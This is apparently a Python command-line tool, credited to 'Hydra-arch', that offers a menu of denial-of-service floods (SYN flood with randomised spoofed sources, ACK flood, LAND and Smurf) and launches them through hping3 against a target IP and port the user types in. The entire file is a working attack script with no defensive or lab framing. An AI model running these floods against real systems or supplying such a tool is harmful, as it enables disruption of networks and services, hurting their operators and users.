#!/usr/bin/env python3

import subprocess
from colorama import init, Fore, Style
import pyfiglet

init()
types = ["Syn Flood", "ACK", "LAND", "Smurf"]

def syn(c, d, target_port, target):
    subprocess.run(["clear"])
    logo = pyfiglet.figlet_format(types[0])
    print(Fore.LIGHTBLUE_EX + logo)
    subprocess.run(["hping3", "-c", c, "-d", d, "-S", "-p", target_port, "--flood", "--rand-source", target])

def ack(target_port, d, target):
    subprocess.run(["clear"])
    logo = pyfiglet.figlet_format(types[1])
    print(Fore.GREEN + logo)
    subprocess.run(["hping3", "--flood", "-A", "-p", target_port, "-d", d, target])

def land(c, s, target_port, target):
    subprocess.run(["clear"])
    logo = pyfiglet.figlet_format(types[2])
    print(Fore.YELLOW + logo)
    subprocess.run(["hping3", "--flood", "-c", c, "-s", s, "-p", target_port, "-S", "-a", target, target])

def smurf(target, broadcast):
    subprocess.run(["clear"])
    logo = pyfiglet.figlet_format(types[3])
    print(Fore.RED + logo)
    subprocess.run(["hping3", "-1", "--flood", "-a", target, broadcast])

print(
Fore.MAGENTA + r"""       ____            ________    ___
      / __ \____  ____/  ___/ /   /  /
     / / / / __ \/ __/  /  / /    / /
    / /_/ / /_/ (__  ) /__/ /____/ /
   /_____/\____/____/\___/_____/___/ 
    """)
print(f"by Hydra-arch\n https://github.com/Hydra-arch\n")
print(Style.RESET_ALL)

for index, item in enumerate(types, start=1):
    print(Fore.LIGHTCYAN_EX + f"[{index}] {item}\n")

attack_type = int(input("Select attack type:  "))

if attack_type == 1:
    c = str(input("Quantity of packages: "))
    d = str(input("Package size: "))
    target_port = str(input("Target port: "))
    target = str(input("Target ip: "))
    syn(c, d, target_port, target)

if attack_type == 2:
    target_port = str(input("Target port: "))
    d = str(input("Package size: "))
    target = str(input("Target ip: "))
    ack(target_port, d, target)

if attack_type == 3:
    c = str(input("Quantity of packages: "))
    s = str(input("Your port: "))
    target_port = str(input("Target port: "))
    target = str(input("Target ip: "))
    land(c, s, target_port, target)

if attack_type == 4:
    broadcast = str(input("Broadcast adress: "))
    target = str(input("Target ip: "))
    smurf(target, broadcast)

